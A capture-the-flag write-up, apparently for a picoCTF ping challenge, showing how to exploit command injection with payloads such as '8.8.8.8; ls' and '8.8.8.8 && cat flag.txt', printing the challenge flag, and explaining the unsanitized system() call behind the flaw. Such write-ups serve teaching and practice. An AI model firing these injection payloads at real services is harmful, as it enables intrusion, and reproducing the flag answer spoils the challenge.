## Initial Observation

The service asks for an IP:

```bash id="m6b3wd"
Enter an IP address to ping!
```

It claims:

> Only allow `8.8.8.8`

Testing normal input:

```bash id="z6e5rb"
8.8.8.8
```

→ Works as expected (runs `ping`)

---

## Identifying the Vulnerability

Given the hint:

> “Sometimes, you can run more than one command at a time.”

This suggests **command injection**.

The backend is likely doing:

```bash id="o7q7ff"
ping <user_input>
```

without proper sanitization.

---

## Confirming Injection

Test with:

```bash id="8b44r8"
8.8.8.8; ls
```

Output shows:

```id="0g8u2q"
flag.txt
script.sh
```

This confirms:

* The input is executed in a shell
* Multiple commands can be injected

---

## Attempt to Read the Flag

Initial attempt:

```bash id="r5n6xg"
8.8.8.8; cat flag.txt
```

This behaved inconsistently (likely due to output buffering or filtering).

---

## Successful Exploit

Using `&&`:

```bash id="5nd0t9"
8.8.8.8 && cat flag.txt
```

### Why this works:

* `&&` executes the second command only if the first succeeds
* Ensures proper command chaining and output handling

---

## Final Output

```id="r7jv5o"
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_e003709d}
```

---

## Root Cause

The application directly inserts user input into a system command:

```bash id="0c3g4l"
system("ping " + input)
```

This allows attackers to:

* Inject additional commands
* Execute arbitrary system commands
